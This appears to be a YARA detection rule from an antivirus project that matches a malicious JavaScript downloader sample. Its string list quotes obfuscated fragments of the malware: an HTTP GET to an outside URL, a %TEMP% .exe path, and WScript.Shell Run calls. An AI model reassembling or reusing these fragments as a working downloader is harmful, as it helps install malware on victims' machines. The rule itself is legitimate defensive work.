rule sig_20160328_4e3b178ca88ce47e696e4e07dde3a318 {
  meta:
    description = "datamaliciousorder - file 20160328_4e3b178ca88ce47e696e4e07dde3a318.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f6c933e3ae2888fd67c8a5aa418c11323686fc687d3810ebe4ea8f98acae8b36"

  strings:
    $s1  = "function Jhxbfftro() {return Zayulovlve[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"iKdLzTmrqzMhyLp.exe\";};" fullword ascii
    $s2  = "Bvhhbew[Xwxbywob](\"GET\", \"http://www.hiveclick.com/m4usd\", false);" fullword ascii
    $s3  = "do {WScript[Iqqeby](Wgjbkuyi() * 11)} while (Bvhhbew[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Zayulovlve = function Czpeyzib() {return WScript[Htvtam](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Qrbscqkps(Dysehdwag, Ixdmbnuj){return Dysehdwag - Ixdmbnuj;};" fullword ascii
    $s6  = "function Mpbners(Zoqgayfag){Zayulovlve[\"Run\"](Zoqgayfag, Ffjhn, Ffjhn);};" fullword ascii
    $s7  = "function Lzpbebmf() {return ((Vywhd == true) && (Vywhd == Liikcjtjl)) ? 1 : Ffjhn;};" fullword ascii
    $s8  = "function Sdmzy(Dtjpdxrepa) {var Avldgdjgvu = (1, 2, 3, 4, 5, Dtjpdxrepa); return Avldgdjgvu;};" fullword ascii
    $s9  = " while (Bkxbfeax){" fullword ascii
    $s10 = "function Oqjxthh()" fullword ascii
    $s11 = "var Peepxxvotp = new this[\"Date\"]();" fullword ascii
    $s12 = "Liikcjtjl = true; " fullword ascii
    $s13 = "var Gdpifnppfb = false;" fullword ascii
    $s14 = "function Wgjbkuyi(){return 22;};" fullword ascii
    $s15 = "function Yfupn(){return Xrdjckikh;};" fullword ascii
    $s16 = "function Njknluck(){return Htvtam;};" fullword ascii
    $s17 = "var Vywhd = false;" fullword ascii
    $s18 = "return Qrbscqkps(Zpwetrq, Xsysvn);" fullword ascii
    $s19 = "Vywhd = true; " fullword ascii
    $s20 = "var Liikcjtjl = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}